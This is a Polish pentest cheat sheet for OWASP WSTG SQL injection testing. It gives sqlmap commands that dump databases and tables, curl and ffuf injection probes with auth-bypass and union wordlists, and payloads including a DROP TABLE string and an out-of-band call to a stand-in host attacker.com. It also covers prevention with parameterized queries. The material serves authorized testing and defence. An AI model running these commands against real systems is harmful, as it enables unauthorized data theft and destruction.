# WSTG-INPV-05 — Testing for SQL Injection

## Cele

- Identify SQL injection points
- Assess the severity of the injection and the level of access that can be achieved

## KOMENDY

### sqlmap - automatyczne wykrywanie i eksploitacja

```bash
sqlmap -u "https://TARGET/page?id=1" --batch --level=3 --risk=2 -o
sqlmap -u "https://TARGET/page?id=1" --batch --dbs
sqlmap -u "https://TARGET/page?id=1" --batch --tables -D database_name
sqlmap -u "https://TARGET/page?id=1" --batch --dump -D database_name -T table_name

```

### sqlmap z POST

```bash
sqlmap -u "https://TARGET/login" --data="username=admin&password=test" --batch --level=3

```

### sqlmap z cookie

```bash
sqlmap -u "https://TARGET/page" --cookie="session=TOKEN;id=1" --level=3 --batch

```

### sqlmap z plikiem request z Burp

```bash
sqlmap -r request.txt --batch --level=5 --risk=3

```

### ghauri - alternatywa dla sqlmap

```bash
ghauri -u "https://TARGET/page?id=1" --batch --level=3

```

### Reczne testowanie

```bash
curl -s "https://TARGET/page?id=1'" | head -50
curl -s "https://TARGET/page?id=1 OR 1=1--" | head -50
curl -s "https://TARGET/page?id=1 AND 1=2--" | head -50
curl -s "https://TARGET/page?id=1 UNION SELECT NULL--" | head -50
curl -s "https://TARGET/page?id=1; WAITFOR DELAY '0:0:5'--"
curl -s "https://TARGET/page?id=1' AND SLEEP(5)--"

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings SQLi payloads

```bash
ffuf -u "https://TARGET/page?id=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/SQL Injection/Intruder/Generic_Fuzz.txt" -mc all -o output_ffuf_sqli_fuzz.json

```

### Auth Bypass payloads

```bash
ffuf -u "https://TARGET/login" -X POST -d "username=FUZZ&password=test" -w "Desktop/WSTG/PayloadsAllTheThings-master/SQL Injection/Intruder/Auth_Bypass.txt" -mc 200,302 -o output_ffuf_sqli_auth.json

```

### Error-based detection

```bash
ffuf -u "https://TARGET/page?id=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/SQL Injection/Intruder/Generic_ErrorBased.txt" -mc all -o output_ffuf_sqli_error.json

```

### Time-based blind (MySQL)

```bash
# Wordlista: Desktop/WSTG/PayloadsAllTheThings-master/SQL Injection/Intruder/FUZZDB_MySQL-WHERE_Time.txt
# Wordlista: Desktop/WSTG/PayloadsAllTheThings-master/SQL Injection/Intruder/Generic_TimeBased.txt

```

### Union Select

```bash
ffuf -u "https://TARGET/page?id=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/SQL Injection/Intruder/Generic_UnionSelect.txt" -mc all -o output_ffuf_sqli_union.json

```

### Polyglots

```bash
ffuf -u "https://TARGET/page?id=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/SQL Injection/Intruder/SQLi_Polyglots.txt" -mc all -o output_ffuf_sqli_poly.json

```

### fuzzdb SQL Injection detect

```bash
ffuf -u "https://TARGET/page?id=FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/sql-injection/detect/xplatform.txt -mc all -o output_ffuf_fuzzdb_sqli.json

```

### SecLists login bypass

```bash
ffuf -u "https://TARGET/login" -X POST -d "username=FUZZ&password=test" -w Desktop/WSTG/SecLists-master/Fuzzing/login_bypass.txt -mc 200,302 -o output_ffuf_login_bypass.json

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj wszystkie parametry wejsciowe (GET, POST, Cookie, Headers)
2. Wstaw apostrof (') i sprawdz czy pojawia sie blad SQL
3. Testuj boolean-based: AND 1=1 vs AND 1=2 (roznica w odpowiedzi)
4. Testuj time-based: SLEEP(5), WAITFOR DELAY, pg_sleep(5)
5. Testuj UNION SELECT do wyciagania danych
6. Sprawdz error messages pod katem ujawnienia bazy danych
7. Testuj blind SQLi przez roznice w odpowiedziach
8. Sprawdz second-order SQLi (payload zapisany i uruchomiony pozniej)


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — SQL_Injection_Prevention_Cheat_Sheet.md, Query_Parameterization_Cheat_Sheet.md, Injection_Prevention_Cheat_Sheet.md

### Mechanizmy obrony (w kolejnosci skutecznosci)

**Defense 1 — Prepared Statements (Parameterized Queries):**
- To PRIMARY DEFENSE — zawsze uzywaj prepared statements zamiast konkatenacji stringow
- Java: `PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?"); stmt.setInt(1, userId);`
- .NET: `SqlCommand cmd = new SqlCommand("SELECT * FROM users WHERE id = @id"); cmd.Parameters.AddWithValue("@id", userId);`
- PHP PDO: `$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id"); $stmt->execute(['id' => $userId]);`
- Python: `cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))`
- Node.js: `connection.query("SELECT * FROM users WHERE id = ?", [userId])`

**Defense 2 — Stored Procedures:**
- Moga byc bezpieczne JESLI nie uzywaja dynamicznego SQL wewnatrz
- Niebezpieczny przyklad: `EXEC('SELECT * FROM users WHERE id = ' + @userId)` — to NADAL jest SQLi
- Bezpieczny przyklad: `SELECT * FROM users WHERE id = @userId` (parameterized wewnatrz procedury)

**Defense 3 — Allowlist Input Validation:**
- Dodatkowa warstwa, NIE jako jedyna obrona
- Uzywaj dla nazw tabel/kolumn, klauzul ORDER BY — tam gdzie parametryzacja nie dziala
- Waliduj typ danych: jesli oczekujesz liczby, konwertuj na int przed uzyciem

**Defense 4 — Escaping User Input:**
- OSTATECZNOSC — tylko gdy inne metody niemozliwe (np. legacy code)
- Kazda baza danych ma inne znaki specjalne do eskejpowania
- MySQL: `mysql_real_escape_string()`, Oracle: zamien `'` na `''`

### Dodatkowe zabezpieczenia
- Zasada least privilege: konto DB aplikacji z minimalnymi uprawnieniami (nie sa, nie dbo)
- Nie uzywaj konta DB z uprawnieniami DBA/root do polaczenia aplikacji
- Usun lub wylacz niepotrzebne funkcje DB (xp_cmdshell w MSSQL, UTL_FILE w Oracle)
- Uzywaj roznych kont DB dla roznych modulow aplikacji
- Uzywaj widokow (views) zamiast bezposredniego dostepu do tabel

### Typowe bledy developerow
- Konkatenacja stringow: `"SELECT * FROM users WHERE name = '" + userName + "'"` — ZAWSZE podatne
- ORM nie chroni przed wszystkim: raw queries w Hibernate HQL, Django raw(), Sequelize literal() sa podatne
- Uzywanie blacklist zamiast allowlist (np. blokowanie `SELECT` ale nie `SeLeCt`)
- Walidacja tylko po stronie klienta (JavaScript) — latwa do obejscia

### Wektory ataku do testowania
- Classic: `' OR '1'='1`, `' UNION SELECT null,null--`, `'; DROP TABLE users--`
- Blind SQLi: `' AND 1=1--` vs `' AND 1=2--` (roznica w odpowiedzi)
- Time-based: `'; WAITFOR DELAY '0:0:5'--` (MSSQL), `' AND SLEEP(5)--` (MySQL)
- Error-based: `' AND 1=CONVERT(int,(SELECT @@version))--`
- Out-of-band: `'; EXEC xp_dirtree '\\\\attacker.com\\share'--`
- Second-order: payload zapisany w DB i uruchomiony pozniej w innym zapytaniu

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| SQLiPy | Integracja SQLMap z Burp przez SQLMap API — automatyczna eksploatacja SQLi | [GitHub](https://github.com/codewatchorg/sqlipy) |
| burp-xss-sql-plugin | Wykrywanie XSS i SQL Injection w parametrach | [GitHub](https://github.com/attackercan/burp-xss-sql-plugin) |
| Burptime | Pomiar czasu odpowiedzi dla time-based blind SQLi | [GitHub](https://github.com/virusdefender/burptime) |
| SQLi Query Tampering | Generator payloadow SQLi z obfuskacja i tamperingiem | [GitHub](https://github.com/xer0days/SQLi-Query-Tampering) |
| SQLMap DNS Collaborator | Eksfiltracja danych SQL przez DNS z Burp Collaborator | [GitHub](https://github.com/lucacapacci/SqlmapDnsCollaborator) |
